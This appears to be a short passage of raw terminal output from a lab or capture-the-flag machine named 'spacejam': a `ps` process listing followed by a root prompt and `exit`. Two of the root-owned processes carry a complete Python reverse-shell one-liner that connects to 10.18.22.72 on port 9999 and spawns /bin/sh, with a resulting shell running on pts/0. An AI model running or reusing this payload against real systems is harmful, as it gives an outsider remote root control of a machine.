jordan    1398  0.0  1.2 368276 12728 ?        S    12:44   0:00  \_ /usr/sbin/apache2 -k start
root      1318  0.0  0.0   4504   744 ?        S    12:42   0:00 /bin/sh -c python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.72",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
root      1319  0.0  0.9  44664  9480 ?        S    12:42   0:00  \_ python -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.72",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
root      1320  0.0  0.1   4504  1636 pts/0    Ss+  12:42   0:00      \_ /bin/sh
root      1528  0.0  1.4 723020 14456 ?        Sl   12:48   0:00 systemd-pam
root      8685  0.0  0.4  36828  4164 ?        Ss   12:50   0:00 /lib/systemd/systemd --user
root      8687  0.0  0.1  61356  2012 ?        S    12:50   0:00  \_ (sd-pam)
root@spacejam:~# exit
